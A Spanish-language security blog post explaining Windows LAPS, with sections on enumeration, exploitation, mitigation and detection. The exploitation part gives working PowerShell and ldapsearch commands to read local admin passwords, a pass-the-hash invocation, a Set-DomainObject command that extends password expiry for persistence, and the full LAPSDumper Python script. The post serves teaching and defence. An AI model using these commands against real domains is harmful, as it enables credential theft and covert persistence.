---
title: LAPS Explicación, explotación y mitigación
date: 2025-09-01
categories: [Passwords]
tags: [passwords, ad, domain, local,laps]     # Los tags deben estar siempre en minúsculas.

---

## 1. ¿Que es LAPS?
Pues para explicarlo que mejor que la explicación de la propia [**Microsoft**](https://learn.microsoft.com/es-es/windows-server/identity/laps/laps-overview)
>  _La solución de contraseñas de administrador local de Windows (Windows LAPS) es una característica de Windows que administra y realiza automáticamente copias de seguridad de la contraseña de una cuenta de administrador local en los dispositivos unidos a Microsoft Entra o unidos a Active Directory de Windows Server. También puede usar Windows LAPS para administrar y hacer copias de seguridad automáticas de la contraseña de la cuenta del Modo de restauración de servicios de directorio (DSRM) en los controladores de dominio de Windows Server Active Directory. Un administrador autorizado puede recuperar la contraseña de DSRM y usarla_.

¿Entendido? En resumen: Una solución para el kaos que hay montado con los administradores locales. ¿No sabes como gestionar ese admin local? Pues a LAPS. Eso está genial, y aunque Microsoft lo traslada como una herramienta que es útil (y suele serlo bastante, sobre todo en escenarios bastante inmaduros en la gestión de identidades) no mitiga todo lo que aveces parece, sobre todo porque parece que al usar LAPS tú administrador local deja de tener impacto en las máquinas en las que se aloja y obviamente no. No hay que transformar una mitigación en una solución inquebrantable (de esas que no existen en ciberseguridad) y usarlo como ese famoso "check del equipo de ciberseguridad".

![Desktop View](/assets/img/laps/laps1.png){: width="500" height="305" }

Es importante entender varios puntos en LAPS
1. El esquema de Active Directory agrega dos nuevas propiedades a los objetos de equipo, llamadas ms-Mcs-AdmPwd y ms-Mcs-AdmPwdExpirationTime.
2. Por defecto, la DACL en ms-Mcs-AdmPwd solo otorga acceso de lectura a los Domain Admins. Cada objeto de equipo tiene permiso para actualizar estas propiedades sobre sí mismo.
3. Los derechos de lectura de AdmPwd pueden delegarse a otros principales (usuarios, grupos, etc.), lo que normalmente se hace a nivel de OU.
4. Se instala una nueva plantilla de GPO, que se utiliza para implementar la configuración de LAPS en las máquinas (pueden aplicarse diferentes directivas a distintas OUs).
5. El cliente de LAPS también se instala en cada máquina (comúnmente distribuido mediante GPO o una solución de gestión de software de terceros).
6. Cuando una máquina ejecuta un gpupdate, comprobará la propiedad AdmPwdExpirationTime en su propio objeto de equipo en AD. Si el tiempo ha expirado, generará una nueva contraseña (basada en la política de LAPS) y la establecerá en la propiedad ms-Mcs-AdmPwd.


## 2. Descubrimiento y enumeración de LAPS

Podemos realizar descubrimiento de LAPS de diferentes maneras en las máquinas, la primera sería localizando AdmPwd.dll

```bash
ls C:\Program Files\LAPS\CSE

AdmPwd.dll
```

También podemos usar [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) para localizar una GPO la cual tenga cualquier referencia a LAPS 

```powershell
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```

A mi particularmente me gusta usar [**SharpView**](https://github.com/tevora-threat/SharpView) por temas de evasión y así evitar importar nada en powershell.
También podemos enumerar la propiedad `ms-Mcs-AdmPwdExpirationTime` siempre que nos sea null y así podremos ver sobre que objetos se aplica esa propiedad.

```powershell
powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

Si localizamos la GPO nos podemos descargar el registro y asía nalizarlo. Tendremos que descargarnos:

```text
\\c0nfig.dominio\SysVol\c0nfig.dominio\Policies\{2CD4357D-D231-4D23-A029-7A999775E689}\Machine\Registry.pol
```
Mediante `Parse-PolFile` de  [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) podemos consumirlo de manera que sea legibley tendremos visibles algunos campos como:
- Complegidad: mayúsculas, minúsculas, números...
- Longitud de contraseña.
- Tiempo de cambio.
- Nombre de la cuenta que gestiona LAPS.
- Protección contra la expliración de contraseñas.


## 3. Explotación de LAPS
### 3.1 ms-Mcs-AdmPwd

Podemos descubrir cuales son los usuarios los cuales tienen permitido leer el atributo ms-Mcs-AdmPwd.

```powershell
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
```
Puedes usar [**LDAPSearch**](https://linux.die.net/man/1/ldapsearch) también si te es más útil:

```text
ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd
```
También puedes usar herramientas en C# si te ayudan para mantenerte oculto como [**SharpLAPS**](https://github.com/swisskyrepo/SharpLAPS).

En caso de que quieras usar Python porque te sientas más cómodo o el motivo que sea peudes usar [**PyLAPS**](https://github.com/p0dalirius/pyLAPS).

Recuerda que puedes usar `powershell ConvertFrom-SID` para posteriormente transformar el SID al nombre del usuario. 

Además podemos usar [**LAPSToolkit**](https://github.com/leoloobeek/LAPSToolkit) para hacer el mismo prooceso. 
```powershell
powershell Find-LAPSDelegatedGroups
```

Con `Find-AdmPwdExtendedRights` podemos buscar también usuarios que tienen acceso sin haberse delegado especificamente

Simplemente tenemos que tratar de leeer el atributo

```powershell
powershell Get-DomainComputer -Identity ordenador -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
PaSSSSWo0rD1-Very-VeryyyyyS3cure
```

![Desktop View](/assets/img/laps/laps2.png){: width="972" height="589" }


### 3.2 Password Expiration Protection
Cuando hemos enumerado la política hemos visto que existe una configuración que es `PwdExpirationProtectionEnabled`, la cual impide al activarse que un usuario o equipo establezca una fecha de caducidad más allá de la edad de la contraseña la cual se especifica en `PasswordAgeDays`. Cuando `PwdExpirationProtectionEnabled` está habilitado y tratamos de cambiar la fecha de caducidad después del día en el que caduca se activa automaticamente el reestablecimiento de la contraseña. Si la configuraciónd e la directiva no se configura la caducidad de la contraseña se desactiva por defecto. 

```powershell
powershell Get-DomainComputer -Identity ordenador -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

ms-mcs-admpwdexpirationtime ms-mcs-admpwd 
--------------------------- ------------- 
         133198989718766666 PaSSSSWo0rD1-Very-VeryyyyyS3cure
```

El número 133101494718702551 podemos transformarlo a un número real con [**epochconverter**](https://www.epochconverter.com/ldap) y nos dirá que es el viernes, 3 de febrero de 2023.

Podemos tratar de ampliar la duración del permiso como método de persitencia por ejemplo hasta 133999999718766666 o mejor dicho el 18 de agosto de 2025. Esto será visible para los administradores y podrán cambiarlo manualmente, pero puede ayudarnos a mantenernos en los sistemas. 

```powershell
powershell Set-DomainObject -Identity ordenador -Set @{'ms-Mcs-AdmPwdExpirationTime' = '133999999718766666'} -Verbose
```

![Desktop View](/assets/img/laps/laps3.jpg){: width="500" height="305" }


### 3.3 Dumping desde Linux
Podeis dumpear LAPS desde Linux siguiendo este post de [**n00py**](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) que además incluye un repositorio en [**github LAPSDumper**](https://github.com/n00py/LAPSDumper/) con código en python para realizarlo. 
 
Para usarlo
`python laps.py -u user -p password -d domain.local`

PTH especificando servidor:

`python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local`

Os dejo el código por aquí  ya que el repo no tiene muchas visitas:

```python
#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse
from datetime import datetime
parser = argparse.ArgumentParser(description='Dump LAPS Passwords')
parser.add_argument('-u','--username',  help='username for LDAP', required=True)
parser.add_argument('-p','--password',  help='password for LDAP (or LM:NT hash)',required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)
parser.add_argument('-c','--computer', help='Target computer', required=False)                                                                                                                                     
parser.add_argument('-o','--output', help='Output file to CSV', required=False)


def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]


def main():
    # Get the current runtime for logging purposes
    getTime = datetime.now()
    runtime = getTime.strftime("%m-%d-%Y %H:%M:%S") 
    print("LAPS Dumper - Running at " + runtime)
    
    args = parser.parse_args()
    #Check if the user specifies a file output. If so, it creates a new CSV.
    if args.output != None:
        filename = args.output + getTime.strftime("-%m-%d-%Y.csv")
        f = open(filename,'w')
        header = ['Computer,Password,Expiration Time,Epoch Expiration Time,Query Time\n']
        f.writelines(header)
        f.close()

    if args.ldapserver:
        s = Server(args.ldapserver, get_info=ALL)
    else:
        s = Server(args.domain, get_info=ALL)
    if args.computer:
        ldap_filter = "(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(cn=" + args.computer + "))"
    else:
        ldap_filter = "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))"
    c = Connection(s, user=args.domain + "\\" + args.username, password=args.password, authentication=NTLM, auto_bind=True)
    try:
    	c.search(search_base=base_creator(args.domain), search_filter=ldap_filter, attributes=['ms-MCS-AdmPwd','ms-Mcs-AdmPwdExpirationTime','cn'])
    	for entry in c.entries:
            print (str(entry['cn']) +" "+ str(entry['ms-Mcs-AdmPwd']))
            #Appends the Machine Name (not Machine Account) + Password + Password Expiration + Epoch (for some reason it wouldn't convert HMS correctly, so I opted for perserving the epoch in logs) + Runtime to the csv.
            if args.output != None:
                epoch = (int(str(entry['ms-Mcs-AdmPwdExpirationTime']))/10000000) - 11644473600
                convertedTime = datetime.fromtimestamp(epoch).strftime("%m-%d-%Y")
                f = open(filename,'a')
                f.writelines(str(entry['cn'])+",\""+ str(entry['ms-Mcs-AdmPwd']) + "\"," + convertedTime + "," + str(epoch) + "," + runtime +"\n")
                f.close()
    except Exception as ex:
    	if ex.args[0] == "invalid attribute type ms-MCS-AdmPwd":
    		print("This domain does not have LAPS configured")
    	else:
    		print(ex)
    	
if __name__ == "__main__":
    main()
```



## 4. Mitigación
Vamos a tratar de ver algunos puntos sobre la configuración a los cuales debemos estar atentos a la hora de configurar LAPS:
1. Asegurarnos de que no hay ningún grupo o usuario que tenga acceso a `ms-MCS-AdmPwd`
2. Eliminar `All extended rights` de aquello que no tenga sentido
3. Por defecto AD permite a usuarios normales añadir máquinas al dominio hasta el limite puesto en `msDS-MachineAccountQuota`. Para esto solo se requiere que el usuario sea admin sobre su máquina. Cuando una máquina se une al Dominio sobre esta manaera puede leer el atributo `ms-MCS-AdmPwd`, incluso después de no tener privilegios de Admin sobre la máquina. Se puede descubrir que máquinas se han unido así mediante `msDS-CreatorSid`.
Puedes usar:
```text
Get-ADComputer -LdapFilter '(msds-CreatorSid=*)' -SearchBase '<domain-or-OU-DN>' -SearchScope Subtree
```
Para eliminar esta capacidad puedes establecer `msDS-MachineAccountQuota` en 0.
4. Lógicamente hay que dejar bien configurado `PwdExpirationProtectionEnabled` ya que no viene por defecto y puede facilitar persistencias. 



## 5. Investigación
Yo me centraría en los siguientes puntos (partiendo de que obviamente localizar por firma software que permite enumerar es inutil en un entorno de verdad):
1. Revisar fechas de caducidad en LAPS muy altas o que incumplan políticas.
2. Consultas LDAP sobre usuarios que tienen privilegios elevados sobre atributos de LAPS.
3. Monitorizar máquinas que tengan LAPS habilitado de manera especial puede ser interesante en algunos entornos.
4. Ten en cuenta que la credencial de LAPS se ha podido obtener mediante otro movimiento, no necesariamente mediante una vulneración de LAPS (y ni siquiera de la máquina). No descartes hipótesis rápido. Los falsos positivos son con una evidencia del mismo tamaño que un positivo.
5. Revisa comportamientos anómalos de usuarios los cuales tengan acceso a las máquinas donde usas LAPS, puedes quizás entender el movimiento lateral previo para dar con el paso. 
6. Revisa toda la parte previa de mitigación ya que son los misconfig que han podido originar el problema. Entender como lo han vulnerado es lo que te va a ayudar a pillarlo. 

![Desktop View](/assets/img/laps/laps4.png){: width="972" height="589" }

## Recursos adicionales:

[**Conceptos Clave en Windows LAPS de Microsoft**](https://learn.microsoft.com/es-es/windows-server/identity/laps/laps-concepts-overview/)

[**Abusing LAPS de Unnsafe-Inline**](https://docs.unsafe-inline.com/unsafe/abusing-laps)

[**Abusing LAPS Toolkit passtheticket**](https://github.com/passtheticket/Abusing_Laps_Toolkit)

[**Abusing LAPS paper ExploitDB**](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf?utm_source=dlvr.it&utm_medium=twitter)

[**Credential Dumping: LAPS de Hacking Articles**](https://www.hackingarticles.in/credential-dumping-laps/)



---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 

---

¡Gracias por tu apoyo! 🙏
![Desktop View](assets/img/banner.png) <br>
